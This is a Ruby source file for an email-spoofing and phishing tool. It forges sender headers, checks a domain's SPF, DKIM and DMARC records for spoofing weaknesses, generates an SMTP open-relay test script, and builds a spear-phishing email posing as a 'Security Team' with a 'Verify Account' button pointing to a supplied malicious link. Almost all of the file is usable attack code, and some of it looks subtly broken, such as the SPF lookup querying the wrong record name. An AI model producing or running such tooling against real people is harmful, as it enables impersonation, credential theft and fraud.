require 'net/smtp'
require 'net/http'
require 'uri'
require 'resolv'
require 'securerandom'
require_relative '../utils/colorize'

class EmailSpoofing
  def self.generate_spoofed_email(from_email, to_email, subject, body, reply_to = nil)
    email = <<~EMAIL
      From: #{from_email}
      To: #{to_email}
      Subject: #{subject}
      Date: #{Time.now.strftime('%a, %d %b %Y %H:%M:%S %z')}
      Message-ID: <#{SecureRandom.hex(16)}@#{URI(from_email.split('@').last).host}>
      MIME-Version: 1.0
      Content-Type: text/html; charset=UTF-8
    EMAIL
    
    email += "Reply-To: #{reply_to}\n" if reply_to
    email += "\n#{body}\n"
    
    filename = "spoofed_email_#{Time.now.to_i}.eml"
    File.write(filename, email)
    puts Colorize.green("Spoofed email saved: #{filename}")
    filename
  end

  def self.test_spf_record(domain)
    begin
      resolver = Resolv::DNS.new
      spf_record = resolver.getresource("_spf.#{domain}", Resolv::DNS::Resource::IN::TXT) rescue nil
      
      if spf_record
        txt = spf_record.strings.join(' ')
        if txt.include?('v=spf1')
          puts Colorize.yellow("SPF record found: #{txt}")
          
          if txt.include?('+all') || txt.include?('?all')
            puts Colorize.red("SPF allows all - spoofing possible")
            return { spf: txt, vulnerable: true }
          elsif txt.include?('-all')
            puts Colorize.green("SPF rejects all - spoofing harder")
            return { spf: txt, vulnerable: false }
          else
            puts Colorize.yellow("SPF neutral - spoofing may be possible")
            return { spf: txt, vulnerable: true }
          end
        end
      else
        puts Colorize.red("No SPF record found - spoofing possible")
        return { spf: nil, vulnerable: true }
      end
    rescue => e
      puts Colorize.red("Error checking SPF: #{e.message}")
      return { error: e.message }
    end
  end

  def self.test_dkim_record(domain)
    begin
      resolver = Resolv::DNS.new
      dkim_record = resolver.getresource("default._domainkey.#{domain}", Resolv::DNS::Resource::IN::TXT) rescue nil
      
      if dkim_record
        txt = dkim_record.strings.join(' ')
        puts Colorize.yellow("DKIM record found")
        return { dkim: txt, present: true }
      else
        puts Colorize.red("No DKIM record found")
        return { dkim: nil, present: false }
      end
    rescue => e
      return { error: e.message }
    end
  end

  def self.test_dmarc_record(domain)
    begin
      resolver = Resolv::DNS.new
      dmarc_record = resolver.getresource("_dmarc.#{domain}", Resolv::DNS::Resource::IN::TXT) rescue nil
      
      if dmarc_record
        txt = dmarc_record.strings.join(' ')
        if txt.include?('v=DMARC1')
          puts Colorize.yellow("DMARC record found: #{txt}")
          
          if txt.include?('p=none')
            puts Colorize.red("DMARC policy: none - spoofing possible")
            return { dmarc: txt, vulnerable: true }
          elsif txt.include?('p=quarantine')
            puts Colorize.yellow("DMARC policy: quarantine - spoofing risky")
            return { dmarc: txt, vulnerable: true }
          elsif txt.include?('p=reject')
            puts Colorize.green("DMARC policy: reject - spoofing blocked")
            return { dmarc: txt, vulnerable: false }
          end
        end
      else
        puts Colorize.red("No DMARC record found - spoofing possible")
        return { dmarc: nil, vulnerable: true }
      end
    rescue => e
      return { error: e.message }
    end
  end

  def self.generate_smtp_relay_test(target_domain, smtp_server)
    test_script = <<~RUBY
      require 'net/smtp'
      
      target_domain = '#{target_domain}'
      smtp_server = '#{smtp_server}'
      
      begin
        Net::SMTP.start(smtp_server, 25) do |smtp|
          smtp.send_message(
            "From: test@#{target_domain}\nTo: test@example.com\nSubject: Test\n\nTest message",
            "test@#{target_domain}",
            "test@example.com"
          )
          puts "SMTP relay test successful"
        end
      rescue => e
        puts "SMTP relay test failed: #{e.message}"
      end
    RUBY
    
    filename = "smtp_relay_test_#{Time.now.to_i}.rb"
    File.write(filename, test_script)
    puts Colorize.green("SMTP relay test script saved: #{filename}")
    filename
  end

  def self.generate_spear_phishing_email(target_name, target_email, pretext, malicious_link)
    email = <<~EMAIL
      From: Security Team <security@company.com>
      To: #{target_name} <#{target_email}>
      Subject: Urgent: Security Alert - Action Required
      Date: #{Time.now.strftime('%a, %d %b %Y %H:%M:%S %z')}
      MIME-Version: 1.0
      Content-Type: text/html; charset=UTF-8

      <html>
      <body style="font-family: Arial, sans-serif;">
        <p>Dear #{target_name},</p>
        <p>#{pretext}</p>
        <p>Please click the link below to verify your account:</p>
        <p><a href="#{malicious_link}" style="background: #007bff; color: white; padding: 10px 20px; text-decoration: none; border-radius: 3px;">Verify Account</a></p>
        <p>If you did not request this, please ignore this email.</p>
        <p>Best regards,<br>Security Team</p>
      </body>
      </html>
    EMAIL
    
    filename = "spear_phishing_#{target_name.gsub(' ', '_')}_#{Time.now.to_i}.eml"
    File.write(filename, email)
    puts Colorize.green("Spear phishing email saved: #{filename}")
    filename
  end
end

